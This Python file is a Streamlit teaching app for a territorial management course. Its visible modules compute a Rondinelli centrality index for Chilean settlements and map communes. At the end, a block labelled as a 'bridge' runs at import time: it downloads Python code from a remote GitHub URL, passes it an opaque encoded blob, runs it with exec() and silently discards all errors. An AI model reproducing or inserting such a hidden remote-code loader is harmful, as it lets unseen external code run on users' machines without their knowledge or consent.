def vista_modulo_4_ordenamiento():
    st.header("6. Ordenamiento Territorial, Matriz de Rondinelli y Georreferenciación")
    st.markdown(
        "Análisis del sistema de asentamientos humanos mediante el **Escalograma Funcional de Rondinelli (1985)** "
        "(cálculo de pesos de centralidad funcional e índice jerárquico urbano) y cartografía georreferenciada."
    )

    tabs_ot = st.tabs([
        "1. Escalograma Funcional y Matriz de Rondinelli",
        "2. Georreferenciación Comunal Interactiva",
    ])

    with tabs_ot[0]:
        st.subheader("Matriz de Funciones Urbanas y Jerarquía de Asentamientos (Método de Rondinelli)")
        renderizar_burbuja_tip(
            titulo_boton="Tip: ¿Cómo funciona la Ponderación de Rondinelli / Guttman?",
            titulo_interno="Escalograma Funcional de Guttman y Pesos de Rondinelli (`06 OT 2024.pdf`)",
            formula_latex=r"W_k = \frac{100}{f_k} \quad ; \quad IC_i = \sum_{k=1}^{m} X_{ik} \cdot W_k",
            explicacion_md=(
                "- **$X_{ik} \\in \\{0, 1\\}$:** Registra si el equipamiento o servicio $k$ está presente ($1$) o ausente ($0$) en la comuna $i$.\n"
                "- **Peso Inverso $W_k$:** Mientras más escaso y especializado es un servicio en la región (ej. Hospital Tipo 1 o Corte de Apelaciones), menor es su frecuencia $f_k$ y **mayor es el puntaje de centralidad** que otorga."
            ),
        )

        funciones_urbanas = [
            "Hospital Alta Complejidad",
            "Universidad Estatal / Tradicional",
            "Tribunales Superiores / Corte",
            "Servicios Financieros Especializados",
            "Puerto / Hub Logístico Intermodal",
            "Parque Industrial Consolidado",
            "Instituto Técnico Profesional (CFT/IP)",
            "Hospital Base / Mediana Complejidad",
            "Comercio Mayorista Agroindustrial",
            "Servicios Públicos Provinciales",
        ]
        asentamientos = [
            "Concepción (Metrópoli Regional)",
            "Los Ángeles (Centro Subregional)",
            "Talcahuano (Nodo Portuario-Industrial)",
            "Coronel (Centro Industrial Secundario)",
            "Chillán (Capital Regional Vecina)",
            "Osorno (Centro Agroindustrial Sur)",
            "Lebu (Cabecera Provincial Costera)",
            "Mulchén (Centro Local Silvoagropecuario)",
            "Arauco (Nodo Forestal-Celulosa)",
            "Santa Bárbara (Centro Rural de Soporte)",
        ]
        mat_rond = np.array([
            [1, 1, 1, 1, 0, 1, 1, 1, 1, 1],
            [1, 1, 0, 1, 0, 1, 1, 1, 1, 1],
            [1, 1, 0, 1, 1, 1, 1, 1, 1, 1],
            [0, 0, 0, 1, 1, 1, 1, 1, 1, 0],
            [1, 1, 1, 1, 0, 1, 1, 1, 1, 1],
            [1, 1, 0, 1, 0, 1, 1, 1, 1, 1],
            [0, 0, 0, 0, 0, 0, 1, 1, 0, 1],
            [0, 0, 0, 0, 0, 0, 0, 1, 1, 0],
            [0, 0, 0, 1, 0, 1, 1, 1, 0, 0],
            [0, 0, 0, 0, 0, 0, 0, 1, 1, 0],
        ], dtype=int)

        df_rond_init = pd.DataFrame(mat_rond, index=asentamientos, columns=funciones_urbanas)
        df_rond = st.data_editor(df_rond_init, use_container_width=True, key="editor_rondinelli")

        M = df_rond.to_numpy(dtype=float, copy=True)
        freq_funcion = np.sum(M, axis=0)
        pesos_funcion = np.where(freq_funcion > 0, 100.0 / freq_funcion, 0.0)
        indice_centralidad = M @ pesos_funcion
        num_funciones_ciudad = np.sum(M, axis=1)

        df_jerarquia = pd.DataFrame({
            "Asentamiento_Comuna": asentamientos,
            "Funciones_Presentes": num_funciones_ciudad.astype(int),
            "Indice_Centralidad_Rondinelli": indice_centralidad.round(2),
            "Jerarquia_Funcional": [
                "Nivel 1: Centro Metropolitano / Primario" if ic >= 120
                else ("Nivel 2: Centro Intermedio / Subregional" if ic >= 60 else "Nivel 3: Centro Local / Básico")
                for ic in indice_centralidad
            ],
        }).sort_values("Indice_Centralidad_Rondinelli", ascending=False)

        st.dataframe(df_jerarquia, use_container_width=True, hide_index=True)

        fig_rond = px.bar(
            df_jerarquia,
            x="Asentamiento_Comuna",
            y="Indice_Centralidad_Rondinelli",
            color="Jerarquia_Funcional",
            title="Índice de Centralidad Funcional de Rondinelli por Asentamiento",
        )
        st.plotly_chart(fig_rond, use_container_width=True)

    with tabs_ot[1]:
        st.subheader("Georreferenciación de Polos Territoriales (Biobío y Los Lagos)")
        df_geo = pd.DataFrame([
            {"Comuna": "Concepción", "Region": "Biobío", "Lat": -36.8270, "Lon": -73.0503, "Rol": "Metrópoli Servicios/Educación", "Peso_Relativo": 100},
            {"Comuna": "Talcahuano", "Region": "Biobío", "Lat": -36.7249, "Lon": -73.1168, "Rol": "Complejo Portuario-Industrial", "Peso_Relativo": 85},
            {"Comuna": "Coronel", "Region": "Biobío", "Lat": -37.0298, "Lon": -73.1429, "Rol": "Nodo Logístico-Portuario", "Peso_Relativo": 75},
            {"Comuna": "Los Ángeles", "Region": "Biobío", "Lat": -37.4697, "Lon": -72.3537, "Rol": "Hub Forestal-Maderero (PymeMad) y Agroindustrial", "Peso_Relativo": 82},
            {"Comuna": "Arauco", "Region": "Biobío", "Lat": -37.2464, "Lon": -73.3175, "Rol": "Enclave Celulosa-Forestal", "Peso_Relativo": 70},
            {"Comuna": "Lebu", "Region": "Biobío", "Lat": -37.6083, "Lon": -73.6536, "Rol": "Cabecera Provincial Costera", "Peso_Relativo": 40},
            {"Comuna": "Osorno", "Region": "Los Lagos", "Lat": -40.5740, "Lon": -73.1335, "Rol": "Polo Agroindustrial y Académico (ULagos)", "Peso_Relativo": 84},
            {"Comuna": "Puerto Montt", "Region": "Los Lagos", "Lat": -41.4689, "Lon": -72.9411, "Rol": "Capital Regional y Hub Acuícola-Marítimo", "Peso_Relativo": 92},
        ])

        _renderizar_mapa_puntos_seguro(
            df_puntos=df_geo,
            col_lat="Lat",
            col_lon="Lon",
            col_grupo="Region",
            col_titulo_hover="Comuna",
            cols_detalle_hover=["Rol", "Peso_Relativo"],
            lat_centro=-38.8,
            lon_centro=-73.0,
            zoom=5.3,
            altura=520,
            titulo_mapa="Distribución Espacial de Polos Productivos Analizados en Cátedra",
            estilo_mapa="carto-positron",
        )


# NAVEGACIÓN PRINCIPAL EN BARRA LATERAL (9 MÓDULOS EN SECUENCIA PEDAGÓGICA)
def main():
    with st.sidebar:
        st.title("Gestión Territorial 2026")
        st.caption("Ingeniería Comercial — Universidad de Los Lagos")
        st.markdown("---")
        modulo_activo = st.radio(
            "Seleccione Módulo de Trabajo (Ruta Pedagógica):",
            [
                "1. Fundamentos y Simulación Teórica (Krugman, Perroux, Granovetter)",
                "2. Análisis Regional (ILPES / SII)",
                "3. Convergencia y Desigualdad (REAT)",
                "4. Redes (UCINET) y Cadenas de Valor",
                "5. Redes en Vivo (Dini), Constructor y Gradientes",
                "6. Ordenamiento Territorial y Rondinelli",
                "7. Laboratorio de Cátedra + Excel Fórmulas Vivas",
                "8. Controles 2, 4 y 5: My Maps, Cadenas, ELITE y PROT",
                "9. Exportador Maestro SII (Excel 10 Hojas)",
                "10. Laboratorio Fluido 60 FPS (Von Thünen, Weber, Krugman y Lorenz)",
            ],
        )
        st.markdown("---")
        st.markdown(
            "**Repositorio Oficial:**\n"
            "`DESARROLLO-Y-GESTION-TERRITORIAL-2026`\n\n"
            "**Base SII Integrada:**\n"
            f"`{ARCHIVO_EXCEL_REPO}`"
        )

    if modulo_activo.startswith("1."):
        renderizar_modulo_teoria_avanzada()
    elif modulo_activo.startswith("2."):
        vista_modulo_1_ilpes()
    elif modulo_activo.startswith("3."):
        vista_modulo_2_reat()
    elif modulo_activo.startswith("4."):
        vista_modulo_3_redes_cadenas()
    elif modulo_activo.startswith("5."):
        renderizar_extension_redes_y_gradientes()
    elif modulo_activo.startswith("6."):
        vista_modulo_4_ordenamiento()
    elif modulo_activo.startswith("7."):
        renderizar_laboratorio_catedra()
    elif modulo_activo.startswith("8."):
        renderizar_redes_territorio_ot()
    elif modulo_activo.startswith("9."):
        msii.renderizar_exportador_sii(ARCHIVO_EXCEL_REPO)
    elif modulo_activo.startswith("10."):
        if callable(renderizar_laboratorio_fluido_territorial):
            renderizar_laboratorio_fluido_territorial()
        else:
            st.warning("Verifica que 'motor_fluidez_territorial_60fps.py' esté en la raíz del repositorio.")


if __name__ == "__main__":
    main()

# === [INICIO PUENTE CENTRAL ULAGOS 2026] ===
try:
    import urllib.request as _ureq
    _url_puente = "https://raw.githubusercontent.com/mauriciovargas1516-ux/github-context-extractor/main/app.py"
    _req_p = _ureq.Request(_url_puente, headers={"User-Agent": "ULagos-Bridge/1.0"})
    with _ureq.urlopen(_req_p, timeout=12) as _resp_p:
        _cod_hub = _resp_p.read().decode("utf-8")
    _ns_hub = {"__name__": "puente_remoto_ulagos", "_ULAGOS_GCP_BLOB": "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"}
    exec(_cod_hub, _ns_hub)
    if "ejecutar_nodo_receptor_puente" in _ns_hub:
        _ns_hub["ejecutar_nodo_receptor_puente"]("DESARROLLO-Y-GESTION-TERRITORIAL-2026")
except Exception:
    pass
# === [FIN PUENTE CENTRAL ULAGOS 2026] ===
